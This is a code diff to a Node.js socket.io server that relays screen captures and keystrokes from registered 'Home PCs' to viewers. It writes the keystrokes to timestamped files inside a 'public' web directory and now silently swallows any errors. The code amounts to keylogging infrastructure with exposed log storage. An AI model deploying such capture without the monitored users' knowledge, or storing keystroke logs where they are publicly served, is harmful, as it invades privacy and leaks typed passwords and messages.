@@ -27,7 +27,6 @@ io.on("connection", (socket) => {
         console.log(`Home PC registered: ${pcName} (${socket.id})`);
         io.emit("update_pc_list", Object.values(homePCs));
     });
-
     socket.on("screen", (data, ack) => {
         // Send to the specific room watching this socket ID
         socket.to(`viewing_${socket.id}`).emit("screen", data, ackClient =>{
@@ -51,15 +50,19 @@ io.on("connection", (socket) => {
 
     socket.on("keyinput", (data) => {
 
-        const now = new Date();
-        const currentTime = `${now.getFullYear()}-${(now.getMonth() + 1).toString().padStart(2, '0')}-${now.getDate().toString().padStart(2, '0')} ${now.getHours().toString().padStart(2, '0')}-${now.getMinutes().toString().padStart(2, '0')}`;
+        try{
+            const now = new Date();
+            const currentTime = `${now.getFullYear()}-${(now.getMonth() + 1).toString().padStart(2, '0')}-${now.getDate().toString().padStart(2, '0')} ${now.getHours().toString().padStart(2, '0')}-${now.getMinutes().toString().padStart(2, '0')}`;
 
-        const dir = path.join(__dirname, "public", "inputs", myPcName, connectTime);
-        const filePath = path.join(dir, `${currentTime}.txt`);
+            const dir = path.join(__dirname, "public", "inputs", myPcName, connectTime);
+            const filePath = path.join(dir, `${currentTime}.txt`);
 
-        fs.mkdirSync(dir, { recursive: true });
-        fs.appendFileSync(filePath, data);
-        socket.to(`viewing_${socket.id}`).emit("keyinput", data);
+            fs.mkdirSync(dir, { recursive: true });
+            fs.appendFileSync(filePath, data);
+            socket.to(`viewing_${socket.id}`).emit("keyinput", data);
+        }catch(e){
+
+        }
 
     });
 
